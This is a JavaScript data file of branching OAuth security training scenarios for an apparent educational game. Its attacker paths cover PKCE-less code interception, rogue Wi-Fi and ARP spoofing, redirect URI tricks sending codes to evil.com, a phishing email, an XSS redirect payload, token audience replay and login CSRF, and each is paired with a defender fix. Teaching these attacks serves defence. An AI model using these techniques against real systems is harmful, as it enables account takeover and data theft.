/**
 * Story Scenarios for Dual Perspective Module
 * Attack Playbook format with branching paths, consequence meters, and learning moments
 */

const STORY_SCENARIOS = [
  {
    id: 'pkce_bypass',
    title: 'The PKCE Bypass',
    category: 'Code Flow Attacks',
    difficulty: 'beginner',
    estimatedTime: '8 min',
    description: 'A public client without PKCE protection leaves authorization codes vulnerable to interception.',

    vulnerableConfig: { requirePkce: false },
    secureConfig: { requirePkce: true, pkceMethod: 'S256' },

    attacker: {
      intro: "You've discovered a web application that uses OAuth 2.0 for authentication. Through reconnaissance, you notice the authorization requests don't include any `code_challenge` parameter...",
      goal: "Intercept an authorization code and use it to gain access to a victim's account.",
      initialRisk: 10,
      initialSuccess: 50,

      steps: {
        start: {
          id: 'start',
          title: 'Initial Reconnaissance',
          narrative: "You examine the OAuth authorization request in the browser's developer tools. The URL looks like this:",
          codeSnippet: `GET /authorize?
  response_type=code
  &client_id=vulnerable-app
  &redirect_uri=https://app.example.com/callback
  &scope=openid profile
  &state=abc123`,
          observation: "Notice: There's no `code_challenge` parameter. This means PKCE is not being used!",
          choices: [
            { id: 'network_intercept', text: 'Set up network interception (MITM)', riskDelta: 15, successDelta: 20, consequence: "Aggressive - higher detection risk but reliable", next: 'network_setup' },
            { id: 'referrer_leak', text: 'Look for referrer header leakage', riskDelta: 5, successDelta: 10, consequence: "Passive - stealthier but depends on app behavior", next: 'referrer_check' },
            { id: 'malware_approach', text: 'Deploy browser malware on target', riskDelta: 40, successDelta: 30, consequence: "Very aggressive - high detection risk", next: 'malware_fail' }
          ]
        },

        malware_fail: {
          id: 'malware_fail',
          title: 'Malware Detected!',
          isFailure: true,
          failureType: 'detected',
          narrative: "Your malware was detected by endpoint protection!",
          codeSnippet: `[ALERT] Windows Defender
Threat detected: Trojan:JS/Redirector
Action taken: Quarantined
User notified: Yes`,
          learningMoment: {
            title: "Why This Failed",
            explanation: "Modern endpoint protection easily detects common OAuth-stealing malware. This approach also crosses legal boundaries. For this attack, passive interception methods are more effective.",
            recommendation: "Stick to network-level attacks or application vulnerabilities."
          },
          choices: [
            { id: 'retry', text: 'Try a different approach', next: 'start', riskDelta: 0, successDelta: -20 }
          ]
        },

        network_setup: {
          id: 'network_setup',
          title: 'Setting Up Network Interception',
          narrative: "You position yourself on the same network as potential victims. You have several options:",
          choices: [
            { id: 'arp_spoof', text: 'ARP spoofing to intercept all traffic', riskDelta: 20, successDelta: 25, consequence: "Captures everything but IDS will detect this", next: 'arp_detected' },
            { id: 'rogue_ap', text: 'Set up a rogue WiFi access point', riskDelta: 10, successDelta: 20, consequence: "Victims must connect, but less detectable", next: 'rogue_ap_success' },
            { id: 'dns_hijack', text: 'DNS hijacking via DHCP', riskDelta: 15, successDelta: 15, consequence: "Selective interception, moderate risk", next: 'capture_code' }
          ]
        },

        arp_detected: {
          id: 'arp_detected',
          title: 'ARP Spoofing Detected!',
          isFailure: true,
          failureType: 'detected',
          narrative: "The network's intrusion detection system flagged your ARP spoofing attack!",
          codeSnippet: `[IDS ALERT] Possible ARP Spoofing
Source MAC: aa:bb:cc:dd:ee:ff
Multiple ARP replies detected
Security team notified`,
          learningMoment: {
            title: "Network Security Controls",
            explanation: "Enterprise networks often have Dynamic ARP Inspection (DAI) and IDS systems. This technique works better on home networks or poorly secured corporate networks.",
            recommendation: "Consider rogue access points or DNS-based attacks instead."
          },
          choices: [
            { id: 'retry', text: 'Try different method', next: 'network_setup', riskDelta: 5, successDelta: -15 }
          ]
        },

        rogue_ap_success: {
          id: 'rogue_ap_success',
          title: 'Rogue Access Point Active',
          narrative: "You've set up a convincing WiFi network named 'Company_Guest_WiFi'. Several users have connected!",
          codeSnippet: `WiFi: Company_Guest_WiFi
Connected clients: 7
Monitoring HTTPS traffic...`,
          observation: "Users are connecting, but HTTPS prevents seeing OAuth codes directly...",
          choices: [
            { id: 'ssl_strip', text: 'Attempt SSL stripping attack', riskDelta: 15, successDelta: 5, consequence: "May work on HTTP, but OAuth servers enforce HTTPS", next: 'ssl_strip_fail' },
            { id: 'wait_http', text: 'Wait for HTTP redirect leakage', riskDelta: 5, successDelta: 15, consequence: "Some apps leak codes in HTTP redirects", next: 'capture_code' }
          ]
        },

        ssl_strip_fail: {
          id: 'ssl_strip_fail',
          title: 'SSL Stripping Failed',
          isFailure: true,
          failureType: 'blocked',
          narrative: "The OAuth server uses HSTS and the browser refuses to downgrade!",
          codeSnippet: `Browser Error:
The site auth.example.com uses HSTS.
Cannot load insecure version.`,
          learningMoment: {
            title: "HSTS Protection",
            explanation: "HTTP Strict Transport Security (HSTS) tells browsers to ALWAYS use HTTPS. Modern OAuth servers use HSTS preloading, which means the browser knows to use HTTPS before ever visiting.",
            recommendation: "SSL stripping is largely obsolete against properly configured OAuth servers."
          },
          choices: [
            { id: 'retry', text: 'Wait for HTTP leakage instead', next: 'capture_code', riskDelta: 0, successDelta: -10 }
          ]
        },

        referrer_check: {
          id: 'referrer_check',
          title: 'Checking for Referrer Leakage',
          narrative: "You examine the callback page for external resources that might leak the authorization code:",
          codeSnippet: `// Examining callback page:
<a href="https://twitter.com/share">Share</a>
<img src="https://analytics.tracker.com/pixel.gif">
<script src="https://cdn.external.com/script.js">`,
          observation: "Multiple external resources! The authorization code in the URL might be leaked via Referer header...",
          choices: [
            { id: 'setup_receiver', text: 'Set up server to capture leaked referrers', riskDelta: 5, successDelta: 15, consequence: "Passive - must wait for users to click links", next: 'capture_code' },
            { id: 'phish_link', text: 'Create phishing page with tracking pixels', riskDelta: 20, successDelta: 25, consequence: "Active - requires victim to visit your page", next: 'capture_code' }
          ]
        },

        capture_code: {
          id: 'capture_code',
          title: 'Authorization Code Captured!',
          narrative: "Your patience paid off! You've intercepted an authorization code:",
          codeSnippet: `Captured redirect:
https://app.example.com/callback?code=authz_7x8y9z&state=abc123

Authorization code: authz_7x8y9z
Expires in: ~60 seconds`,
          observation: "You have a valid code, but it expires quickly!",
          choices: [
            { id: 'exchange_immediate', text: 'Exchange immediately for tokens', riskDelta: 10, successDelta: 20, consequence: "Fast but might trigger rate limits", next: 'exchange_code' },
            { id: 'verify_first', text: 'First verify the code format', riskDelta: 5, successDelta: -10, consequence: "Careful but code might expire", next: 'code_expired' }
          ]
        },

        code_expired: {
          id: 'code_expired',
          title: 'Code Expired!',
          isFailure: true,
          failureType: 'blocked',
          narrative: "By the time you finished verifying, the authorization code expired!",
          codeSnippet: `{
  "error": "invalid_grant",
  "error_description": "Authorization code has expired"
}`,
          learningMoment: {
            title: "Authorization Code Lifetime",
            explanation: "Authorization codes are intentionally short-lived (typically 30-60 seconds) as a security measure. This limits the window for interception attacks.",
            recommendation: "In real attacks, automate token exchange to happen within seconds of capture."
          },
          choices: [
            { id: 'retry', text: 'Wait for another code', next: 'capture_code', riskDelta: 5, successDelta: 0 }
          ]
        },

        exchange_code: {
          id: 'exchange_code',
          title: 'Exchanging the Code',
          narrative: "You quickly send a token request to the authorization server:",
          codeSnippet: `POST /token HTTP/1.1
Host: auth.example.com
Content-Type: application/x-www-form-urlencoded

grant_type=authorization_code
&code=authz_7x8y9z
&redirect_uri=https://app.example.com/callback
&client_id=vulnerable-app`,
          configCheck: 'requirePkce',
          onSecure: {
            title: 'Attack Blocked!',
            narrative: "The server requires PKCE and rejects your request:",
            codeSnippet: `{
  "error": "invalid_request",
  "error_description": "code_verifier is required"
}`,
            explanation: "With PKCE enabled, the server requires a code_verifier that matches the original code_challenge. Without it, you cannot exchange the stolen code!",
            endingType: 'blocked'
          },
          onVulnerable: {
            title: 'Attack Succeeded!',
            narrative: "The server responds with tokens:",
            codeSnippet: `{
  "access_token": "eyJhbGciOiJSUzI1NiIs...",
  "token_type": "Bearer",
  "expires_in": 3600,
  "refresh_token": "ref_abc123..."
}`,
            explanation: "Without PKCE, the server cannot verify you're the legitimate client. You now have full access to the victim's account!",
            endingType: 'success'
          }
        }
      }
    },

    defender: {
      intro: "You're the security engineer responsible for your company's OAuth implementation. A security audit has flagged that your public clients aren't using PKCE...",
      goal: "Configure the authorization server to require PKCE and prevent code interception attacks.",
      initialRisk: 0,
      initialSuccess: 100,

      steps: {
        start: {
          id: 'start',
          title: 'Review Current Configuration',
          narrative: "You examine the current OAuth client configuration:",
          codeSnippet: `Client: vulnerable-app
Type: Public (SPA)
PKCE Required: false
Redirect URIs: https://app.example.com/callback`,
          observation: "The client is a Single Page Application (public client) but PKCE is not required. This is a vulnerability!",
          showControls: ['requirePkce', 'pkceMethod'],
          choices: [
            { id: 'enable_pkce', text: 'Enable PKCE requirement immediately', riskDelta: 0, successDelta: 30, consequence: "Quick fix, but may break clients not yet updated", next: 'enable_pkce' },
            { id: 'gradual', text: 'Plan gradual rollout with monitoring', riskDelta: 0, successDelta: 20, consequence: "Safer deployment but vulnerability persists longer", next: 'gradual_rollout' },
            { id: 'investigate', text: 'First investigate which clients are affected', riskDelta: 0, successDelta: 10, consequence: "Thorough approach but delays the fix", next: 'investigate' }
          ]
        },

        investigate: {
          id: 'investigate',
          title: 'Client Analysis',
          narrative: "You analyze which clients are using your OAuth server:",
          codeSnippet: `Active Clients:
- mobile-app (confidential) - Has client_secret
- web-backend (confidential) - Has client_secret
- spa-frontend (public) - NO client_secret !!
- partner-widget (public) - NO client_secret !!`,
          observation: "Two public clients need PKCE protection urgently.",
          choices: [
            { id: 'enable_all', text: 'Enable PKCE for all clients', riskDelta: 0, successDelta: 25, next: 'enable_pkce' },
            { id: 'enable_public', text: 'Enable PKCE for public clients first', riskDelta: 0, successDelta: 20, next: 'enable_pkce' }
          ]
        },

        gradual_rollout: {
          id: 'gradual_rollout',
          title: 'Planning Gradual Rollout',
          narrative: "You decide to take a measured approach:",
          codeSnippet: `Rollout Plan:
Week 1: Enable PKCE in logging-only mode
Week 2: Warn clients not using PKCE
Week 3: Require PKCE for new authorizations
Week 4: Enforce PKCE for all requests`,
          observation: "Good for stability, but you remain vulnerable during transition.",
          choices: [
            { id: 'start_rollout', text: 'Begin Week 1 - Enable logging', riskDelta: 0, successDelta: 15, next: 'enable_pkce' },
            { id: 'accelerate', text: 'Accelerate - Skip to enforcement', riskDelta: 0, successDelta: 25, next: 'enable_pkce' }
          ]
        },

        enable_pkce: {
          id: 'enable_pkce',
          title: 'Enable PKCE Protection',
          narrative: "You're ready to enable PKCE. Update the configuration:",
          instruction: "Toggle 'Require PKCE' to ON and ensure method is 'S256'.",
          showControls: ['requirePkce', 'pkceMethod'],
          configCheck: 'requirePkce',
          onSecure: {
            title: 'Configuration Updated',
            narrative: "Excellent! PKCE is now required:",
            codeSnippet: `// Client generates PKCE values:
code_verifier = random(43-128 chars)
code_challenge = base64url(sha256(code_verifier))

// Auth request includes:
&code_challenge=E9Melhoa2OwvFrEMTJguCHaoeK1t8...
&code_challenge_method=S256

// Token request must include:
&code_verifier=original_random_value`,
            explanation: "Now the authorization code is cryptographically bound to the code_verifier. Only the client with the verifier can exchange the code!",
            endingType: 'success'
          },
          onVulnerable: {
            title: 'Still Vulnerable',
            narrative: "PKCE is still disabled. Your clients remain vulnerable.",
            instruction: "Enable PKCE to continue.",
            continueDisabled: true
          }
        }
      }
    }
  },

  {
    id: 'redirect_hijack',
    title: 'The Redirect Hijack',
    category: 'Code Flow Attacks',
    difficulty: 'intermediate',
    estimatedTime: '10 min',
    description: 'Loose redirect URI validation enables attackers to steal authorization codes via phishing.',

    vulnerableConfig: { strictRedirectUri: false, allowWildcardRedirects: true },
    secureConfig: { strictRedirectUri: true, allowWildcardRedirects: false, httpsOnlyRedirects: true },

    attacker: {
      intro: "You've found an OAuth client that seems to have loose redirect URI validation. Time to see if you can redirect authorization codes to your own server...",
      goal: "Craft a malicious authorization URL that redirects the victim's authorization code to your server.",
      initialRisk: 15,
      initialSuccess: 40,

      steps: {
        start: {
          id: 'start',
          title: 'Testing Redirect Validation',
          narrative: "First, let's probe the authorization server to understand how it validates redirect URIs:",
          codeSnippet: `// Registered redirect URI:
https://app.example.com/callback

// You'll test various manipulations...`,
          choices: [
            { id: 'test_subdomain', text: 'Try subdomain: app.example.com.evil.com', riskDelta: 10, successDelta: 15, consequence: "Common vulnerability in prefix-only validation", next: 'subdomain_test' },
            { id: 'test_path', text: 'Try path traversal: /callback/../evil', riskDelta: 5, successDelta: 10, consequence: "Works if server doesn't normalize paths", next: 'path_test' },
            { id: 'test_param', text: 'Try extra params: /callback?forward=evil', riskDelta: 5, successDelta: 5, consequence: "Depends on callback handling", next: 'param_test' },
            { id: 'test_fragment', text: 'Try fragment: /callback#@evil.com', riskDelta: 15, successDelta: 5, consequence: "Browser tricks, rarely works", next: 'fragment_fail' }
          ]
        },

        fragment_fail: {
          id: 'fragment_fail',
          title: 'Fragment Attack Failed',
          isFailure: true,
          failureType: 'blocked',
          narrative: "The authorization server strips fragments before validation.",
          codeSnippet: `Error: invalid_redirect_uri
redirect_uri does not match registered URIs`,
          learningMoment: {
            title: "URL Fragment Handling",
            explanation: "Browsers don't send URL fragments (#...) to servers in HTTP requests. OAuth 2.0 explicitly forbids fragments in redirect URIs (RFC 6749 Section 3.1.2).",
            recommendation: "Focus on domain and path manipulation instead."
          },
          choices: [
            { id: 'retry', text: 'Try a different technique', next: 'start', riskDelta: 5, successDelta: -5 }
          ]
        },

        subdomain_test: {
          id: 'subdomain_test',
          title: 'Testing Subdomain Manipulation',
          narrative: "You craft a URL using subdomain tricks:",
          codeSnippet: `https://auth.example.com/authorize?
  client_id=vulnerable-app
  &redirect_uri=https://app.example.com.evil.com/callback
  &response_type=code`,
          configCheck: 'strictRedirectUri',
          onSecure: {
            title: 'Blocked by Strict Validation',
            narrative: "The server rejects your manipulated URL:",
            codeSnippet: `{
  "error": "invalid_redirect_uri",
  "error_description": "must exactly match registered URI"
}`,
            explanation: "Strict validation compares the entire URL as an exact string match. Your subdomain trick doesn't match.",
            endingType: 'blocked'
          },
          onVulnerable: {
            title: 'Validation Bypassed!',
            narrative: "The server accepts your malicious redirect URI!",
            codeSnippet: `HTTP/1.1 302 Found
Location: https://app.example.com.evil.com/callback?code=authz_xyz`,
            explanation: "The server only checks if redirect URI STARTS with the registered domain. Your subdomain trick bypasses this!",
            next: 'craft_phishing'
          }
        },

        path_test: {
          id: 'path_test',
          title: 'Testing Path Traversal',
          narrative: "You try to escape the registered path:",
          codeSnippet: `https://app.example.com/callback/../admin/steal
https://app.example.com/callback/..%2F..%2Fadmin`,
          observation: "Testing if the server normalizes paths before validation...",
          choices: [
            { id: 'encoded', text: 'Try double URL encoding', riskDelta: 10, successDelta: 10, consequence: "Might bypass WAFs", next: 'path_result' },
            { id: 'subdomain', text: 'Try subdomain approach instead', riskDelta: -5, successDelta: 5, next: 'subdomain_test' }
          ]
        },

        path_result: {
          id: 'path_result',
          title: 'Path Traversal Result',
          narrative: "Most modern OAuth servers normalize paths before validation...",
          codeSnippet: `{
  "error": "invalid_redirect_uri",
  "error_description": "Path must match exactly"
}`,
          observation: "Path traversal doesn't work here.",
          choices: [
            { id: 'subdomain', text: 'Try subdomain manipulation', riskDelta: 0, successDelta: 10, next: 'subdomain_test' }
          ]
        },

        param_test: {
          id: 'param_test',
          title: 'Testing Parameter Injection',
          narrative: "You add parameters to the callback URL:",
          codeSnippet: `https://app.example.com/callback?forward=https://evil.com`,
          observation: "This works if the callback page has an open redirect...",
          choices: [
            { id: 'analyze', text: 'Analyze callback page behavior', riskDelta: 5, successDelta: 15, next: 'callback_analysis' }
          ]
        },

        callback_analysis: {
          id: 'callback_analysis',
          title: 'Callback Page Analysis',
          narrative: "You examine how the callback handles the code:",
          codeSnippet: `// Callback JavaScript:
const code = urlParams.get('code');
const returnUrl = urlParams.get('return');
if (returnUrl) {
  // VULNERABLE: Open redirect!
  window.location = returnUrl + '?code=' + code;
}`,
          observation: "Open redirect found! You can chain this with OAuth.",
          choices: [
            { id: 'chain', text: 'Create exploit chain', riskDelta: 15, successDelta: 25, next: 'craft_phishing' }
          ]
        },

        craft_phishing: {
          id: 'craft_phishing',
          title: 'Crafting the Phishing Campaign',
          narrative: "Now you need to get victims to click your malicious link:",
          choices: [
            { id: 'email', text: 'Send phishing emails as IT support', riskDelta: 25, successDelta: 30, consequence: "High success but email filters may catch it", next: 'phishing_email' },
            { id: 'social', text: 'Post on social media', riskDelta: 15, successDelta: 20, consequence: "Wider reach, less targeted", next: 'capture_redirect' },
            { id: 'watering', text: 'Compromise a frequently visited site', riskDelta: 35, successDelta: 35, consequence: "Complex but very effective", next: 'watering_hole' }
          ]
        },

        phishing_email: {
          id: 'phishing_email',
          title: 'Crafting Phishing Email',
          narrative: "You create a convincing phishing email:",
          codeSnippet: `From: it-support@examp1e.com
Subject: Urgent: Verify Your Account

Dear User,
Please verify your account:
[Verify Now] -> your malicious URL`,
          choices: [
            { id: 'targeted', text: 'Send to specific high-value targets', riskDelta: 10, successDelta: 20, next: 'capture_redirect' },
            { id: 'mass', text: 'Send to large email list', riskDelta: 30, successDelta: 25, next: 'mass_detected' }
          ]
        },

        mass_detected: {
          id: 'mass_detected',
          title: 'Mass Campaign Detected!',
          isFailure: true,
          failureType: 'detected',
          narrative: "Your mass email campaign was flagged by spam filters!",
          codeSnippet: `Email Gateway Alert:
Blocked: 847 emails
SPF: FAIL (spoofed sender)
Reported to security team`,
          learningMoment: {
            title: "Email Security",
            explanation: "Mass phishing is easily detected by email security systems. SPF, DKIM, and DMARC checks catch spoofed senders.",
            recommendation: "Targeted spear-phishing has better success rates."
          },
          choices: [
            { id: 'retry', text: 'Try targeted approach', next: 'phishing_email', riskDelta: 5, successDelta: -15 }
          ]
        },

        watering_hole: {
          id: 'watering_hole',
          title: 'Watering Hole Setup',
          narrative: "You need to compromise a site your targets visit:",
          codeSnippet: `Target: blog.example-news.com
Vulnerability: XSS in comments
Payload: <script>location='YOUR_URL'</script>`,
          choices: [
            { id: 'deploy', text: 'Deploy XSS payload', riskDelta: 25, successDelta: 30, next: 'capture_redirect' },
            { id: 'simpler', text: 'Too risky - use simpler phishing', riskDelta: -10, successDelta: -5, next: 'phishing_email' }
          ]
        },

        capture_redirect: {
          id: 'capture_redirect',
          title: 'Capturing the Redirect',
          narrative: "A victim clicks your link, authenticates, and...",
          configCheck: 'strictRedirectUri',
          onSecure: {
            title: 'Attack Blocked!',
            narrative: "The server rejected your malicious redirect URI!",
            codeSnippet: `{
  "error": "invalid_redirect_uri",
  "error_description": "does not match registered URIs"
}`,
            explanation: "Strict validation only accepts EXACT matches. Your malicious URI was rejected before the user could authenticate!",
            endingType: 'blocked'
          },
          onVulnerable: {
            title: 'Attack Succeeded!',
            narrative: "The victim is redirected to YOUR server with their code!",
            codeSnippet: `GET https://evil.attacker.com/steal?code=authz_victim123

Authorization Code: authz_victim123
Victim: user@company.com`,
            explanation: "Loose redirect validation accepted your malicious URI. You now have the victim's authorization code!",
            endingType: 'success'
          }
        }
      }
    },

    defender: {
      intro: "Your security team has received reports of phishing attacks targeting your OAuth flow. Attackers are redirecting authorization codes to their servers...",
      goal: "Implement strict redirect URI validation to prevent open redirect attacks.",
      initialRisk: 0,
      initialSuccess: 100,

      steps: {
        start: {
          id: 'start',
          title: 'Investigating the Reports',
          narrative: "You examine the authorization server logs:",
          codeSnippet: `Suspicious requests:
redirect_uri=https://app.example.com.evil.com/callback
redirect_uri=https://evil.com/?ref=app.example.com
redirect_uri=https://app.example.com/callback/../evil`,
          observation: "The server is accepting redirect URIs that don't exactly match!",
          showControls: ['strictRedirectUri', 'allowWildcardRedirects', 'httpsOnlyRedirects'],
          choices: [
            { id: 'fix', text: 'Enable strict validation now', riskDelta: 0, successDelta: 30, next: 'enable_strict' },
            { id: 'analyze', text: 'First analyze which clients might break', riskDelta: 0, successDelta: 15, next: 'impact_analysis' }
          ]
        },

        impact_analysis: {
          id: 'impact_analysis',
          title: 'Impact Analysis',
          narrative: "You analyze current redirect URI patterns:",
          codeSnippet: `Current patterns:
OK  https://app.example.com/callback
??  https://app.example.com/callback?state=xyz
??  https://staging.app.example.com/callback
BAD https://localhost:3000/callback`,
          observation: "Some legitimate uses might break. Update client configs first.",
          choices: [
            { id: 'update', text: 'Update clients, then enable strict', riskDelta: 0, successDelta: 25, next: 'enable_strict' },
            { id: 'force', text: 'Enable strict now, fix clients as needed', riskDelta: 0, successDelta: 20, next: 'enable_strict' }
          ]
        },

        enable_strict: {
          id: 'enable_strict',
          title: 'Implementing Strict Validation',
          narrative: "Configure strict redirect URI matching:",
          instruction: "Enable 'Strict URI Matching' and disable 'Allow Wildcards'.",
          showControls: ['strictRedirectUri', 'allowWildcardRedirects', 'httpsOnlyRedirects'],
          configCheck: 'strictRedirectUri',
          onSecure: {
            title: 'Strict Validation Enabled',
            narrative: "The server now only accepts exact URI matches:",
            codeSnippet: `Validation rules:
- Exact string match required
- No wildcards allowed
- Path normalization before compare

Accepted: https://app.example.com/callback
Rejected: https://app.example.com/callback?param
Rejected: https://evil.app.example.com/callback`,
            explanation: "Strict matching ensures even subtle variations are rejected. Attackers can no longer manipulate redirect URIs!",
            endingType: 'success'
          },
          onVulnerable: {
            title: 'Still Vulnerable',
            narrative: "Without strict validation, attackers can still manipulate redirect URIs.",
            instruction: "Enable strict validation to secure your OAuth flow.",
            continueDisabled: true
          }
        }
      }
    }
  },

  {
    id: 'audience_confusion',
    title: 'The Audience Confusion',
    category: 'Token Security',
    difficulty: 'intermediate',
    estimatedTime: '8 min',
    description: 'Tokens without audience validation can be replayed across different services.',

    vulnerableConfig: { validateAudience: false },
    secureConfig: { validateAudience: true },

    attacker: {
      intro: "You've legitimately obtained an access token for a low-privilege frontend service. You wonder if you can use this same token to access other, more sensitive services...",
      goal: "Replay a token obtained for one service against a different, higher-privilege service.",
      initialRisk: 20,
      initialSuccess: 30,

      steps: {
        start: {
          id: 'start',
          title: 'Examining Your Token',
          narrative: "You decode the JWT access token you received:",
          codeSnippet: `{
  "iss": "https://auth.company.com",
  "sub": "user_12345",
  "aud": "frontend-app",
  "scope": "read:profile",
  "exp": 1699999999
}`,
          observation: "The token's audience is 'frontend-app'. You want to access 'admin-api' which has much more sensitive data...",
          choices: [
            { id: 'enumerate', text: 'Enumerate other services first', riskDelta: 10, successDelta: 15, consequence: "Discover potential targets", next: 'enumerate_services' },
            { id: 'direct', text: 'Try the token against admin-api directly', riskDelta: 20, successDelta: 10, consequence: "Quick but might trigger alerts", next: 'attempt_replay' }
          ]
        },

        enumerate_services: {
          id: 'enumerate_services',
          title: 'Service Enumeration',
          narrative: "You scan for other services using the same OAuth server:",
          codeSnippet: `Discovered services:
- frontend-app     (your token)
- admin-api        ★ Administrative functions
- billing-service  ★★ Payment processing
- user-service     User management
- analytics-api    Usage statistics`,
          choices: [
            { id: 'admin', text: 'Try token against admin-api', riskDelta: 15, successDelta: 20, next: 'attempt_replay' },
            { id: 'billing', text: 'Try token against billing-service', riskDelta: 25, successDelta: 25, consequence: "Higher value but likely more security", next: 'billing_attempt' }
          ]
        },

        billing_attempt: {
          id: 'billing_attempt',
          title: 'Billing Service Access Attempt',
          narrative: "You try your frontend token against billing:",
          codeSnippet: `GET https://billing-service.company.com/invoices
Authorization: Bearer eyJhbGciOiJSUzI1NiIs...`,
          choices: [
            { id: 'check', text: 'Check the response', riskDelta: 5, successDelta: 5, next: 'billing_blocked' }
          ]
        },

        billing_blocked: {
          id: 'billing_blocked',
          title: 'Billing Service Blocked',
          isFailure: true,
          failureType: 'blocked',
          narrative: "The billing service has additional protections:",
          codeSnippet: `{
  "error": "forbidden",
  "details": {
    "expected_aud": "billing-service",
    "expected_scope": "billing:read",
    "received_aud": "frontend-app",
    "received_scope": "read:profile"
  }
}`,
          learningMoment: {
            title: "Defense in Depth",
            explanation: "High-value services often implement multiple security layers. Billing validates BOTH audience AND requires specific scopes.",
            recommendation: "Target services with weaker security configurations."
          },
          choices: [
            { id: 'admin', text: 'Try admin-api instead', next: 'attempt_replay', riskDelta: 5, successDelta: 0 }
          ]
        },

        attempt_replay: {
          id: 'attempt_replay',
          title: 'Token Replay Attempt',
          narrative: "You send your frontend-app token to the admin API:",
          codeSnippet: `GET https://admin-api.company.com/users
Authorization: Bearer eyJhbGciOiJSUzI1NiIs...

// Your token claims:
{
  "aud": "frontend-app",  // <- wrong audience!
  "scope": "read:profile"
}`,
          configCheck: 'validateAudience',
          onSecure: {
            title: 'Attack Blocked!',
            narrative: "The admin API validates the audience claim:",
            codeSnippet: `{
  "error": "invalid_token",
  "error_description": "Token audience 'frontend-app' does not match 'admin-api'"
}`,
            explanation: "The admin API properly validates incoming tokens have the correct audience. Your frontend token cannot access admin endpoints!",
            endingType: 'blocked'
          },
          onVulnerable: {
            title: 'Attack Succeeded!',
            narrative: "The admin API accepts your frontend token!",
            codeSnippet: `{
  "users": [
    {"id": "1", "email": "ceo@company.com", "role": "admin"},
    {"id": "2", "email": "cfo@company.com", "role": "admin"}
  ],
  "total": 1547
}`,
            explanation: "The admin API didn't check the audience claim! Your token, intended only for the frontend, gave you access to sensitive admin data. This is a 'confused deputy' attack.",
            endingType: 'success'
          }
        }
      }
    },

    defender: {
      intro: "Your organization runs multiple microservices using the central OAuth server. A penetration test revealed tokens can be used across service boundaries...",
      goal: "Configure resource servers to properly validate token audience claims.",
      initialRisk: 0,
      initialSuccess: 100,

      steps: {
        start: {
          id: 'start',
          title: 'Understanding Token Flow',
          narrative: "You review how tokens flow through your microservices:",
          codeSnippet: `Token flow:
User -> Auth Server -> Token (aud: frontend-app)
                    |
        Frontend ✓  (correct audience)
                    |
        Admin API ? (SHOULD reject!)
        Billing ?   (SHOULD reject!)`,
          observation: "If an attacker gets ANY valid token, they could use it against ALL services!",
          showControls: ['validateAudience'],
          choices: [
            { id: 'audit', text: 'Audit all services for audience validation', riskDelta: 0, successDelta: 20, next: 'audit_services' },
            { id: 'enable', text: 'Enable audience validation immediately', riskDelta: 0, successDelta: 25, next: 'configure_validation' }
          ]
        },

        audit_services: {
          id: 'audit_services',
          title: 'Service Audit',
          narrative: "You check each service's token validation:",
          codeSnippet: `Service Audit:
| Service         | Aud Check | Status     |
|-----------------|-----------|------------|
| frontend-app    | None      | VULNERABLE |
| admin-api       | None      | VULNERABLE |
| billing-service | Enabled   | SECURE     |
| user-service    | None      | VULNERABLE |`,
          observation: "3 out of 4 services are vulnerable to token replay!",
          choices: [
            { id: 'fix', text: 'Enable validation on all services', riskDelta: 0, successDelta: 30, next: 'configure_validation' }
          ]
        },

        configure_validation: {
          id: 'configure_validation',
          title: 'Configuring Audience Validation',
          narrative: "Each service needs to validate the audience claim:",
          instruction: "Enable 'Validate Audience' to ensure each service only accepts tokens intended for it.",
          showControls: ['validateAudience'],
          codeSnippet: `// Admin API config:
{
  "name": "admin-api",
  "oauth": {
    "issuer": "https://auth.company.com",
    "expected_audience": "admin-api",
    "validate_audience": true
  }
}`,
          configCheck: 'validateAudience',
          onSecure: {
            title: 'Audience Validation Enabled',
            narrative: "All services now validate the audience claim:",
            codeSnippet: `// Token validation:
1. Extract 'aud' claim from token
2. Compare with service's expected audience
3. Reject if mismatch

Token (aud: frontend) -> Admin API (expects: admin)
Result: REJECTED - audience mismatch`,
            explanation: "Now each service only accepts tokens specifically issued for it. A frontend token cannot access admin endpoints!",
            endingType: 'success'
          },
          onVulnerable: {
            title: 'Still Vulnerable',
            narrative: "Without audience validation, tokens can be replayed across services.",
            instruction: "Enable audience validation to secure your microservices.",
            continueDisabled: true
          }
        }
      }
    }
  },

  {
    id: 'csrf_login',
    title: 'The Login CSRF',
    category: 'Code Flow Attacks',
    difficulty: 'advanced',
    estimatedTime: '10 min',
    description: 'Without state parameter validation, attackers can force victims to log in with the attacker\'s account.',

    vulnerableConfig: { requireStateParam: false },
    secureConfig: { requireStateParam: true },

    attacker: {
      intro: "You want to access a victim's sensitive data, but instead of stealing their credentials, you have a clever idea: what if you could make them log into YOUR account without realizing it?",
      goal: "Execute a CSRF attack that links the victim's session to your OAuth account, so data they enter goes to you.",
      initialRisk: 25,
      initialSuccess: 35,

      steps: {
        start: {
          id: 'start',
          title: 'Planning the Attack',
          narrative: "The attack makes a victim complete an OAuth flow using YOUR authorization code:",
          codeSnippet: `Attack Flow:
1. You login and get YOUR auth code
2. DON'T use it - save it
3. Trick victim into callback with YOUR code
4. Victim's session -> YOUR account
5. Any data victim enters -> YOUR account!`,
          observation: "This only works if the app doesn't validate the 'state' parameter...",
          choices: [
            { id: 'check', text: 'Check if target uses state parameter', riskDelta: 5, successDelta: 10, next: 'check_state' },
            { id: 'proceed', text: 'Proceed with attack setup', riskDelta: 15, successDelta: 5, next: 'get_code' }
          ]
        },

        check_state: {
          id: 'check_state',
          title: 'Checking State Parameter',
          narrative: "You examine the OAuth flow:",
          codeSnippet: `// Authorization request:
GET /authorize?
  client_id=tax-app
  &redirect_uri=https://taxapp.com/callback
  &response_type=code
  &state=      <- Empty or missing!

// Callback:
GET /callback?code=xyz123  <- No state!`,
          observation: "No state parameter! The app is vulnerable to CSRF!",
          choices: [
            { id: 'setup', text: 'Perfect! Set up the attack', riskDelta: 10, successDelta: 20, next: 'get_code' }
          ]
        },

        get_code: {
          id: 'get_code',
          title: 'Getting Your Auth Code',
          narrative: "First, authenticate with YOUR account and capture the code:",
          codeSnippet: `// You authenticate to the tax app...
// Intercept the callback:
https://taxapp.com/callback?code=ATTACKER_CODE_xyz

// DON'T complete the flow!
Your code: ATTACKER_CODE_xyz`,
          observation: "You have an unused code for YOUR account.",
          choices: [
            { id: 'form', text: 'Create hidden form submission attack', riskDelta: 15, successDelta: 20, next: 'create_csrf' },
            { id: 'img', text: 'Use image tag for GET-based CSRF', riskDelta: 10, successDelta: 15, consequence: "Simpler, only works if callback is GET", next: 'img_attack' }
          ]
        },

        img_attack: {
          id: 'img_attack',
          title: 'Image Tag Attack',
